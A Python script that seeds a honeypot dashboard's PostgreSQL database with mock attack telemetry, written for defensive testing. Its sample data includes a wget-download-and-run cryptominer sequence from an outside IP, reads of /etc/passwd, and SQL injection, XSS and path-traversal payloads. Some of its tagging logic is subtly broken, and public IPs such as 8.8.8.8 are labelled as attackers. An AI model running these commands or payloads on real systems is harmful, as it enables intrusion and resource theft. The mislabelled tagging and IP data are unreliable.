"""
honeystack – Sample Data Exporter
Generates and populates PostgreSQL with anonymized mock/real attack telemetry:
SSH brute forces, HTTP scans, geolocation profiles, campaigns, and MITRE alignments.
"""
import os
import sys
import json
import asyncio
import random
from datetime import datetime, timedelta

from dotenv import load_dotenv
from sqlalchemy import text
from sqlalchemy.ext.asyncio import create_async_engine

# Load environment
load_dotenv()

# We connect to localhost port 5433 for local scripting, or docker-compose default db:5432
_raw_url = os.getenv("DATABASE_URL", "postgresql://honeystack_admin:honeystack_secure_pass_123@localhost:5433/honeystack_db")
if "@db:5432" in _raw_url:
    _raw_url = _raw_url.replace("@db:5432", "@localhost:5433")
DATABASE_URL = _raw_url.replace("postgresql://", "postgresql+asyncpg://", 1)

# List of sample attackers (anonymized/public scan IPs)
ATTACK_IPS = [
  {"ip": "185.156.74.52", "country": "Netherlands", "code": "NL", "isp": "Creanova Hosting", "asn": "AS49981"},
  {"ip": "45.143.203.14", "country": "Russia", "code": "RU", "isp": "VDSina", "asn": "AS43513"},
  {"ip": "114.238.109.84", "country": "China", "code": "CN", "isp": "Chinanet", "asn": "AS4134"},
  {"ip": "8.8.8.8", "country": "United States", "code": "US", "isp": "Google LLC", "asn": "AS15169"},
  {"ip": "20.112.56.92", "country": "United States", "code": "US", "isp": "Microsoft Corp", "asn": "AS8075"},
  {"ip": "81.92.120.5", "country": "Germany", "code": "DE", "isp": "Netcup GmbH", "asn": "AS197854"},
  {"ip": "103.24.120.55", "country": "India", "code": "IN", "isp": "Reliance Jio", "asn": "AS55836"},
  {"ip": "210.140.10.99", "country": "Japan", "code": "JP", "isp": "Sakura Internet", "asn": "AS7684"},
  {"ip": "198.51.100.12", "country": "Canada", "code": "CA", "isp": "Shaw Communications", "asn": "AS6327"},
]

SSH_USERNAMES = ["root", "admin", "support", "ubuntu", "user", "oracle", "postgres"]
SSH_PASSWORDS = ["root", "admin", "admin123", "password", "123456", "12345678", "super", "secret"]

HTTP_PATHS = [
  {"path": "/.env", "method": "GET", "attack": "SQLi", "type": "scan"},
  {"path": "/wp-login.php", "method": "POST", "attack": "CredStuffing", "type": "scan"},
  {"path": "/admin/index.html", "method": "GET", "attack": "Scan", "type": "scan"},
  {"path": "/phpmyadmin/index.php", "method": "GET", "attack": "Scan", "type": "scan"},
  {"path": "/actuator/env", "method": "GET", "attack": "PathTraversal", "type": "scan"},
  {"path": "/console", "method": "GET", "attack": "CmdInjection", "type": "scan"},
  {"path": "/?id=1' UNION SELECT NULL,username,password FROM users--", "method": "GET", "attack": "SQLi", "type": "SQLi"},
  {"path": "/comment?body=<script>alert(1)</script>", "method": "POST", "attack": "XSS", "type": "XSS"},
  {"path": "/download?file=../../../../etc/passwd", "method": "GET", "attack": "PathTraversal", "type": "PathTraversal"},
]

COMMAND_FLOWS = [
  ["uname -a", "whoami", "cd /tmp", "wget http://45.143.203.14/miner", "chmod +x miner", "./miner -o pool.supportxmr.com"],
  ["ls -la", "pwd", "cat /etc/passwd", "exit"],
  ["netstat -tuln", "ps aux", "history"],
]

async def populate_data():
    logger = open(1, "w") # Print helper
    print(f"Connecting to database at {DATABASE_URL}...", file=logger)
    engine = create_async_engine(DATABASE_URL)
    
    async with engine.begin() as conn:
        print("Clearing existing tables to start fresh...", file=logger)
        await conn.execute(text("TRUNCATE TABLE mitre_tags, events, ip_profiles, credentials, campaigns CASCADE"))
        
        # 1. Insert IP Profiles
        print("Populating IP profiles...", file=logger)
        stmt_profile = text("""
            INSERT INTO ip_profiles (ip, abuse_score, report_count, country, country_code, city, isp, asn, org, last_enriched)
            VALUES (:ip, :abuse_score, :report_count, :country, :country_code, :city, :isp, :asn, :org, :last_enriched)
        """)
        for item in ATTACK_IPS:
            await conn.execute(stmt_profile, {
                "ip": item["ip"],
                "abuse_score": random.randint(10, 95),
                "report_count": random.randint(5, 120),
                "country": item["country"],
                "country_code": item["code"],
                "city": "ThreatCity",
                "isp": item["isp"],
                "asn": item["asn"],
                "org": item["isp"] + " Org",
                "last_enriched": datetime.utcnow()
            })

        # 2. Insert Campaigns
        print("Populating Coordinated Campaigns...", file=logger)
        stmt_campaign = text("""
            INSERT INTO campaigns (id, name, shared_credentials, shared_user_agent, shared_commands, start_time, last_active, ip_count)
            VALUES (:id, :name, CAST(:shared_credentials AS jsonb), :shared_user_agent, CAST(:shared_commands AS jsonb), :start_time, :last_active, :ip_count)
        """)
        
        # Miner Campaign
        await conn.execute(stmt_campaign, {
            "id": 1,
            "name": "Campaign-SSH-Miner-Deployment",
            "shared_credentials": json.dumps(["root:admin123", "admin:admin123"]),
            "shared_user_agent": None,
            "shared_commands": json.dumps(COMMAND_FLOWS[0]),
            "start_time": datetime.utcnow() - timedelta(hours=6),
            "last_active": datetime.utcnow() - timedelta(minutes=10),
            "ip_count": 3
        })
        
        # WP Scanner Campaign
        await conn.execute(stmt_campaign, {
            "id": 2,
            "name": "Campaign-HTTP-WP-Login-Stuffing",
            "shared_credentials": json.dumps(["admin:admin", "admin:password123"]),
            "shared_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) WPScan/3.8.22",
            "shared_commands": None,
            "start_time": datetime.utcnow() - timedelta(hours=4),
            "last_active": datetime.utcnow() - timedelta(minutes=15),
            "ip_count": 4
        })

        # 3. Insert Common Brute-force Credentials
        print("Populating credentials repository...", file=logger)
        stmt_cred = text("""
            INSERT INTO credentials (username, password, classification, first_seen, last_seen, attempt_count)
            VALUES (:username, :password, :classification, :first_seen, :last_seen, :attempt_count)
        """)
        for u, p in [("root", "root"), ("admin", "admin123"), ("root", "admin123"), ("support", "support")]:
            await conn.execute(stmt_cred, {
                "username": u,
                "password": p,
                "classification": "rockyou_top_1000",
                "first_seen": datetime.utcnow() - timedelta(days=2),
                "last_seen": datetime.utcnow() - timedelta(minutes=2),
                "attempt_count": random.randint(50, 400)
            })

        # 4. Insert Events (mix of SSH and HTTP)
        print("Injecting sample honeypot event logs...", file=logger)
        stmt_event = text("""
            INSERT INTO events (
                id, timestamp, sensor_type, source_ip, source_port, processed,
                ssh_username, ssh_password, ssh_client_version, ssh_commands,
                http_method, http_path, http_query, http_headers, http_body, http_user_agent, attack_type, campaign_id
            ) VALUES (
                :id, :timestamp, :sensor_type, :source_ip, :source_port, :processed,
                :ssh_username, :ssh_password, :ssh_client_version, CAST(:ssh_commands AS jsonb),
                :http_method, :http_path, :http_query, CAST(:http_headers AS jsonb), :http_body, :http_user_agent, :attack_type, :campaign_id
            )
        """)
        
        event_id = 1
        now = datetime.utcnow()
        
        # Create 120 events spread over the last 24 hours
        for i in range(120):
            timestamp = now - timedelta(minutes=random.randint(5, 1440))
            attacker = random.choice(ATTACK_IPS)
            sensor_type = "SSH" if random.random() < 0.6 else "HTTP"
            
            campaign_id = None
            # Align campaign mappings
            if i % 8 == 0:
                campaign_id = 1 # Miner Campaign
            elif i % 8 == 1:
                campaign_id = 2 # WP Scan Campaign

            bound = {
                "id": event_id,
                "timestamp": timestamp,
                "sensor_type": sensor_type,
                "source_ip": attacker["ip"],
                "source_port": random.randint(1024, 65535),
                "processed": True,
                "ssh_username": None,
                "ssh_password": None,
                "ssh_client_version": None,
                "ssh_commands": None,
                "http_method": None,
                "http_path": None,
                "http_query": None,
                "http_headers": None,
                "http_body": None,
                "http_user_agent": None,
                "attack_type": None,
                "campaign_id": campaign_id,
            }
            
            if sensor_type == "SSH":
                bound["ssh_username"] = random.choice(SSH_USERNAMES)
                bound["ssh_password"] = random.choice(SSH_PASSWORDS)
                bound["ssh_client_version"] = "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5"
                if campaign_id == 1:
                    bound["ssh_commands"] = COMMAND_FLOWS[0]
                else:
                    bound["ssh_commands"] = random.choice(COMMAND_FLOWS[1:])
            else:
                path_obj = random.choice(HTTP_PATHS)
                bound["http_method"] = path_obj["method"]
                bound["http_path"] = path_obj["path"]
                bound["http_user_agent"] = "Mozilla/5.0 WPScan/3.8.22" if campaign_id == 2 else "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
                bound["attack_type"] = path_obj["attack"]
                bound["http_headers"] = json.dumps({"User-Agent": bound["http_user_agent"], "Accept": "*/*"})

            if bound["ssh_commands"] is not None:
                bound["ssh_commands"] = json.dumps(bound["ssh_commands"])

            await conn.execute(stmt_event, bound)
            
            # 5. Insert MITRE Tags for this event
            stmt_mitre = text("""
                INSERT INTO mitre_tags (event_id, technique_id, technique_name)
                VALUES (:event_id, :technique_id, :technique_name)
            """)
            if sensor_type == "SSH":
                await conn.execute(stmt_mitre, {"event_id": event_id, "technique_id": "T1110.001", "technique_name": "Password Guessing"})
                if bound["ssh_commands"] == COMMAND_FLOWS[0]:
                    await conn.execute(stmt_mitre, {"event_id": event_id, "technique_id": "T1496", "technique_name": "Resource Hijacking"})
                    await conn.execute(stmt_mitre, {"event_id": event_id, "technique_id": "T1059", "technique_name": "Command & Scripting Interpreter"})
            else:
                if "SQLi" in bound["http_path"]:
                    await conn.execute(stmt_mitre, {"event_id": event_id, "technique_id": "T1190", "technique_name": "Exploit Public-Facing Application"})
                elif ".env" in bound["http_path"] or "config.php" in bound["http_path"]:
                    await conn.execute(stmt_mitre, {"event_id": event_id, "technique_id": "T1552.001", "technique_name": "Credentials in Files"})
                elif "admin" in bound["http_path"] or "wp-login.php" in bound["http_path"] or "phpmyadmin" in bound["http_path"]:
                    await conn.execute(stmt_mitre, {"event_id": event_id, "technique_id": "T1078", "technique_name": "Valid Accounts"})
                else:
                    await conn.execute(stmt_mitre, {"event_id": event_id, "technique_id": "T1595.002", "technique_name": "Vulnerability Scanning"})

            event_id += 1

        print("Database successfully seeded with 120 sample security events!", file=logger)
    
    await engine.dispose()

if __name__ == "__main__":
    asyncio.run(populate_data())
